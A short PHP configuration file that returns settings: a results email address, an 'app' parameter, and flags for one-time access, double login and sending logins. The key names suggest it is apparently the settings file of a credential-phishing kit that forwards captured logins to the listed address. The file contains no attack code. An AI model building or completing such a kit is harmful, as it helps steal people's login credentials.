<?php
return array (
  'result_email' => 'karma@entity.net',
  'parameter' => 'app',
  'onetime_access' => true,
  'double_login' => true,
  'send_login' => true,
);
